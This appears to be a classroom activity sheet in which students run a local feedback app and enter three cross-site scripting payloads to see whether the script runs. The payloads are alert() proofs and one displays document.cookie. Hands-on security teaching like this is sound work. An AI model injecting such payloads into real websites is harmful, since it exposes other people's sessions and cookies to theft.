Get the Alert on the Feedback
======================
In this activity, you will check for XSS vulnerability of a website.

<img src= "https://s3-whjr-curriculum-uploads.whjr.online/0dd21a9d-588c-4125-98b7-682aeaa857dd.gif" width = "100%" height = "50%">

Follow the given steps to complete this activity.

1. Run `app.py` and open the feedback app.
2. Perform the Cross Site Scripting Attack by entering following lines in the feedback box:
    ```
    <script>alert('Hello! You are Hacked')</script>
    ```
    or

    ```
     <img src onerror="alert(document.cookie)">
    ```
    or
    ```
    <img src onerror="alert("Hello! You are Hacked')">
    ```

Check if the script runs when the feedback page opens.
